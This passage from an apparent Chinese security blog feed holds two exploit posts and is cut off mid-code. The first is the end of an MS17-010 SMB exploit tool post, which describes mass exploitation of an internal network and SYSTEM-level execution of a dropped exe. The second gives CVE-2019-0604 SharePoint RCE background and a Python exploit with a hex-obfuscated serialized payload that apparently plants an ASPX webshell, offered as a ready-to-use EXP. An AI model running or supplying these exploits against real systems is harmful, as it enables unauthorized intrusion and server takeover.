<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
<p><strong>内网批量</strong></p>
<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
<p>&nbsp;</p>
<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
      <categories>
        <category>Exp</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>MS17010</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
    <url>/p/e896a7d1.html</url>
    <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
<p><span style="font-size: 16px;">Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</span></p>
<p><span style="font-size: 16px;">Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</span></p>
<p><span style="font-size: 18px;"><strong>影响版本：</strong></span></p>
<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">Microsoft SharePoint Enterprise Server 2016</span></div>
<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Foundation 2013 SP1</span></div>
<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">harePoint Server 2010 SP2</span></div>
<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Server 2019。</span></div>
<h2 id="h2-2"><span style="font-size: 18px;">攻击入口</span></h2>
<p><span style="font-size: 16px;">ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</span></p>
<p><span style="font-size: 16px;">该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种：</span></p>
<pre><span style="font-size: 16px;"><code class="hljs css">&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in             <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.dll

<p>&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.dll<br></span></span></span></span></span></span></span></span></span></span></p></span></span></span></span></span></span></span></span></code></span></pre><p></p>
<p><span style="font-size: 16px;">利用第一种 <span style="font-size: 16px;">PickerDialogType </span>类型</span></p>
<p>&nbsp;</p>
<h2 id="h2-3">PoC</h2>
<p><span style="font-size: 16px;">当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 &ldquo;__&rdquo; 为开头时(类似于&ldquo;_dummy&rdquo;)，</span></p>
<p><span style="font-size: 16px;">EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。</span></p>
<p><span style="font-size: 16px;">这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。</span></p>
<p>&nbsp;</p>
<p><span style="font-size: 18px;"><strong>补充：</strong></span></p>
<p><span style="font-size: 16px;">作者说只要构造一个XML序列化的Payload就可以了，但是Payload提交到哪里呢？</span></p>
<p><span style="font-size: 16px;">原文中只说了一半,完整POST以及具体参数如下：</span></p>
<p><span style="font-size: 16px;">URL： /Picker.aspx?PickerDialogType=控件的程序集限定名&nbsp; <br></span></p>
<p><span style="font-size: 16px;">参数： <span style="font-size: 16px;">ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=<span style="font-size: 16px;">payload </span></span></span></p>
<p><span style="font-size: 16px;"><span style="font-size: 16px;">实际上还需访问<span style="font-size: 16px;">Picker.aspx</span>附带的其它参数，测试我不附带其它参数时提交表单是失败的。</span></span></p>
<p>&nbsp;</p>
<p><span style="font-size: 16px;">此漏洞分析文章出来时就想搭环境测试了，第一天下载APP安装后发现下错了<span style="font-size: 16px;">，</span></span></p>
<p><span style="font-size: 16px;">加上项目未遇到该程序，搭环境也浪费时间懒得弄，就暂时丢一边了。</span></p>
<p><span style="font-size: 16px;">今天发现上周已经弄了一半，又重新研究了一下。</span></p>
<p>&nbsp;</p>
<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">详情请看原文，我想以下文章应该不少人看过了吧，所谓原理很多人都能说得出来</span></strong></p>
<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">就是都在等一个真正能用的EXP吧，哈哈哈，我就是传说中的云黑客&ldquo;鸡你太美&rdquo;！</span></strong></p>
<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">原文(英文): <a href="https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" target="_blank">https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability</a></span></p>
<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">译文(中文): <a href="https://www.anquanke.com/post/id/173476" target="_blank">https://www.anquanke.com/post/id/173476</a></span></p>
<p>&nbsp;</p>
<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 18px;"><strong>EXP</strong></span></p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;">#cve-2019-0604 SharePoint RCE exploit
#date: 20190618 #author: <a href="https://www.cnblogs.com/k8gege" target="_blank">k8gege</a>
import urllib
import urllib2
import sys
import requests
url0 = sys.argv[1]
url1 = '/_layouts/15/Picker.aspx?PickerDialogType='
url = url0 + url1 
shellurl=url0+'/_layouts/15/ua.aspx'
exp='\x63\x76\x65\x2D\x32\x30\x31\x39\x2D\x30\x36\x30\x34\x20\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x20\x52\x43\x45\x20\x65\x78\x70\x6C\x6F\x69\x74'
paySpanData='\x63\x74\x6C\x30\x30\x24\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E\x24\x63\x74\x6C\x30\x35\x24\x68\x69\x64\x64\x65\x6E\x53\x70\x61\x6E\x44\x61\x74\x61';
paySection='\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E'
ct1='\x63\x74\x6C\x30\x30\x24'
ct2='\x24\x63\x74\x6C\x30\x35'
spver = '\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2E\x57\x65\x62\x43\x6F\x6E\x74\x72\x6F\x6C\x73\x2E\x49\x74\x65\x6D\x50\x69\x63\x6B\x65\x72\x44\x69\x61\x6C\x6F\x67\x2C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2C\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x35\x2E\x30\x2E\x30\x2E\x30\x2C\x43\x75\x6C\x74\x75\x72\x65\x3D\x6E\x65\x75\x74\x72\x61\x6C\x2C\x50\x75\x62\x6C\x69\x63\x4B\x65\x79\x54\x6F\x6B\x65\x6E\x3D\x37\x31\x65\x39\x62\x63\x65\x31\x31\x31\x65\x39\x34\x32\x39\x63'
uapay='\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74'
payload1='\x5F\x5F\x62\x70\x38\x32\x63\x31\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x65\x32\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x36\x30\x30\x32\x33\x30\x30\x62\x35\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x35\x37\x30\x30\x30\x37\x30\x30\x65\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x36\x34\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x37\x37\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x36\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x34\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x33\x34\x30\x30\x35\x37\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x35\x37\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x65\x36\x30\x30\x35\x36\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x34\x35\x30\x30\x66\x36\x30\x30\x62\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x33\x33\x30\x30\x31\x33\x30\x30\x32\x36\x30\x30\x36\x36\x30\x30\x33\x33\x30\x30\x38\x33\x30\x30\x35\x33\x30\x30\x36\x33\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x33\x33\x30\x30\x36\x33\x30\x30\x34\x33\x30\x30\x35\x36\x30\x30\x33\x33\x30\x30\x35\x33\x30\x30\x64\x35\x30\x30\x63\x32\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30'
payload2='\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x30\x32\x30\x30\x36\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x31\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x36\x36\x30\x30\x64\x32\x30\x30\x31\x33\x30\x30\x36\x33\x30\x30\x32\x32\x30\x30\x66\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x63\x33\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x64\x32\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x32\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x61\x33\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x65\x33\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30'
payload3='\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x64\x36\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x32\x36\x30\x30\x32\x32\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x36\x30\x30\x63\x36\x30\x30\x32\x37\x30\x30\x64\x32\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x65\x36\x30\x30\x66\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x33\x37\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x33\x37\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x35\x37\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x33\x34\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x62\x37\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x61\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x64\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x36\x30\x30\x64\x36\x30\x30\x34\x36\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x36\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x30\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x30\x34\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x61\x34\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x30\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x34\x37\x30\x30\x66\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x62\x33\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x64\x33\x30\x30\x32\x35\x